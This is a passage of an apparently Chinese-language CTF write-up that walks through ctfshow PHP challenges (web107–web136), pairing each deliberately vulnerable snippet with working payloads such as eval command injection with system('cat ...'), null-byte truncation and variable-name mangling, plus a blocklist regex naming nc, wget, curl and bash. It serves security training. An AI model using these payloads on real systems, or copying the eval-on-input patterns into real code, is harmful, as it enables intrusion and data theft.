variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>postÊñπÂºè‰º†ÂÖ•v1ÔºågetÊñπÂºè‰º†ÂÖ•v3„ÄÇ<br><code>parse_str(\$v1,\$v2);</code>Â∞Üv1ÁöÑÂÜÖÂÆπÂΩì‰Ωúv2ÁöÑÂèÇÊï∞„ÄÇ<br><code> if($v2[&#39;flag&#39;]==md5($v3))&#123;</code>v2ÁöÑflagÂèÇÊï∞ÁöÑÂÄºÂÄºÁ≠â‰∫é‰º†ÂÖ•ÁöÑv3‰º†ÂÖ•ÂèÇÊï∞ÁöÑMD5Âä†ÂØÜÂêéÁöÑÂÄº<br>payloadÔºö<br>GETÔºö?v3&#x3D;2<br>POSTÔºöv1&#x3D;flag&#x3D;c81e728d9d4c2f636f067f89cc14862c<br>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/0a7356866de6432faeb98ab83664f174.png" alt="1"></p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Âè™Êúâ36dÁöÑ‰∫∫ÊâçËÉΩÁúãÂà∞flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//0x36d=877</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>^ÊòØÂºÄÂßã‰ΩçÁΩÆÔºå$ÊòØÁªìÊùü‰ΩçÁΩÆ„ÄÇ<br><code>if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;</code><br>Âú®get‰º†ÂÖ•ÂèÇÊï∞‰∏≠Êü•ÁúãÊòØÂê¶ÊòØa-zA-ZÂºÄÂ§¥ÁöÑÔºåÂ¶ÇÊûúÊòØËøîÂõûtrue„ÄÇË¶ÅÁªïËøáÁ¨¨‰∏Ä‰∏™ifËØ≠Âè•ÔºåÂøÖÈ°ª‰Ωø‰∏∫true„ÄÇÁÑ∂ÂêéÊâçËÉΩ‰∏çÊâßË°ådieÂáΩÊï∞„ÄÇ<br><code>if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;</code>Â∞Ü‰º†ÂÖ•ÁöÑÂÄºÂÄíÁΩÆÂº±Á±ªÂûãÂà§Êñ≠ÊòØÂê¶ÊòØÊï¥Êï∞877<br>payloadÔºö<code>?c=a%00778</code>(%00Êà™Êñ≠ÊºèÊ¥û)<br><img src="https://img-blog.csdnimg.cn/3a66812e55b34ce78493c509e02c84fe.png" alt="2"></p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v1Âíåv2‰º†ÂÖ•ÁöÑÂÄºËã•Âê´ÊúâÂ≠óÊØçÂàôÊâßË°åeval()ÂáΩÊï∞„ÄÇ<br>payloadÔºö<code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>Êàñ<code>?v1=ReflectionClass&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>„ÄÇÂæóÂà∞flag„ÄÇ</p><blockquote><p><strong>?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‚Äúcat fl36dg.txt‚Äù)</strong><br>ËøôÊÆµ‰ª£Á†ÅÁöÑ‰ΩúÁî®ÊòØ‰ΩøÁî®PHPÁöÑÂèçÂ∞ÑÊú∫Âà∂Êù•Ëé∑Âèñ‰∏Ä‰∏™Áî±ÊâßË°å‚Äùls‚ÄùÂëΩ‰ª§ÁöÑÁªìÊûúËøîÂõûÁöÑÁ±ªÁöÑ‰ø°ÊÅØÔºåÂπ∂Â∞ÜËØ•‰ø°ÊÅØËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫‰∏≠„ÄÇ<br>ÂÖ∑‰ΩìÂú∞ÔºåËøôÊÆµ‰ª£Á†Å‰ΩøÁî®‰∫ÜPHPÁöÑÂèçÂ∞ÑÁ±ªReflectionClassÊù•Ëé∑ÂèñÁî±system(‚Äúls‚Äù)ÂëΩ‰ª§ÊâßË°åËøîÂõûÁöÑÁ±ªÁöÑ‰ø°ÊÅØ„ÄÇÂÖ∂‰∏≠Ôºåsystem(‚Äúls‚Äù)ÊâßË°å‰∫Ü‰∏Ä‰∏™shellÂëΩ‰ª§‚Äùls‚ÄùÔºåÂπ∂Â∞ÜÂÖ∂ËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫„ÄÇÂèçÂ∞ÑÁ±ªReflectionClassÈÄöËøáÊé•Êî∂‰∏Ä‰∏™Á±ªÂêçÂèÇÊï∞Êù•Ëé∑ÂèñËØ•Á±ªÁöÑ‰ø°ÊÅØÔºåËøôÈáåÁöÑÁ±ªÂêçÂ∞±ÊòØÁî±‚Äùls‚ÄùÂëΩ‰ª§ËøîÂõûÁöÑÁªìÊûú„ÄÇ</p></blockquote><blockquote><p><code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code><br>ËØ•ÂëΩ‰ª§‰ΩøÁî®PHPËØ≠Ë®Ä‰∏≠ÁöÑsystem()ÂáΩÊï∞Êù•ÊâßË°ålsÂëΩ‰ª§ÔºåÂπ∂Â∞ÜÁªìÊûú‰º†ÈÄíÁªôExceptionÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞ÔºåÁÑ∂ÂêéÂ∞ÜËØ•ÂºÇÂ∏∏ÂÆû‰æã‰º†ÈÄíÁªôechoËØ≠Âè•„ÄÇ<br>Êç¢Âè•ËØùËØ¥ÔºåËØ•ÂëΩ‰ª§ÁöÑÊÑèÊÄùÊòØÂú®PHPËÑöÊú¨‰∏≠ÊâßË°ålsÂëΩ‰ª§ÔºåÂ∞ÜÂÖ∂ÁªìÊûú‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôExceptionÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞ÔºåÁÑ∂ÂêéÂ∞ÜËøô‰∏™ÂºÇÂ∏∏ÂØπË±°ËæìÂá∫Âà∞Â±èÂπï‰∏ä„ÄÇÂú®Ëøô‰∏™ËøáÁ®ã‰∏≠ÔºåÂ¶ÇÊûúlsÂëΩ‰ª§ÊâßË°åÂá∫ÈîôÔºå‰ºöÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏Âπ∂ÊòæÁ§∫Âú®Â±èÂπï‰∏ä„ÄÇ</p></blockquote><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>‰∏çÊÑßÊòØphpÁâπÊÄßÔºåÈÉΩÊ≤°ËßÅËøáÔºÅÔºÅ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÊñ∞‰∫ÜËß£Âà∞‰∏Ä‰∏™phpÂáΩÊï∞<br><strong>FilesystemIterator</strong>Áî®Êù•ÂàõÂª∫ÂΩìÂâçÁõÆÂΩïÁöÑËø≠‰ª£Âô®„ÄÇ<br><strong>getcwd</strong>Ëé∑ÂèñÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï<br><img src="https://img-blog.csdnimg.cn/0f75cdbef7f64326b050074b58979d04.png" alt="1"><br>payload:<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br><img src="https://img-blog.csdnimg.cn/8c05431e2cff4c28863fa30926446d1a.png" alt="2"><br>ËÆøÈóÆÊñá‰ª∂ÂæóÂà∞flag„ÄÇ</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2310602538cb43ab9e19ec98fe2c2ef2.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/270988a18f6d41919e68794c19bbb57b.png" alt="2"><br>Â•ΩÂÉèÊ≤°ËøáÊª§<strong>\f</strong></p><p>payloadÔºö<br>GETÔºö?num&#x3D;%0c36</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$a</code>Âú®Êú¨È¢ò‰∏≠Ê≤°Áî®ÔºåÈúÄË¶Å‰º†ÂÖ•CTF_SHOWÔºåCTF_SHOW.COMÂπ∂‰∏î‰∏ç‰º†ÂÖ•fl0g„ÄÇ<br>payloadÔºö<code>POST CTF_SHOW=1&amp;CTF_SHOW.COM=2&amp;fun=echo $flag</code>‰ΩÜÊòØ‰∏çÊàêÂäüÔºåÂéüÊù•ÊòØÊää<code>.</code>ÁªôËøáÊª§Êéâ‰∫Ü„ÄÇËøôÈáå‰∫ÜËß£Âà∞phpÁöÑ‰∏Ä‰∏™ÁâπÊÄßphpÊ†áÂèòÈáèÂêçÂè™ÂÖÅËÆ∏Êï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫øÔºåÂΩìpostÊàñget‰º†ÂÖ•ÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúÂê´ÊúâÁ©∫Ê†ºÔºå+Ôºå[  Âàô‰ºöËΩ¨Âåñ‰∏∫_Ôºå‰ΩÜÊòØÂ¶ÇÊûú‰º†ÂÖ•[  ‰πãÂêé‰ªñ‰ºöË¢´ËΩ¨Âåñ‰∏∫_ÔºåÊ≠§Êó∂ÂêéÈù¢ÁöÑÂ≠óÁ¨¶Â∞±‰ºöË¢´‰øùÁïô‰∏ãÊù•ËÄå‰∏ç‰ºöË¢´ÊõøÊç¢„ÄÇ<br>payloadÔºö<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ΩøÁî®highlight_file()ÂáΩÊï∞„ÄÇ<br>payloadÔºö<code>**GET** ?shell=flag.php  **POST**  CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[shell]) </code></p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|system|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token 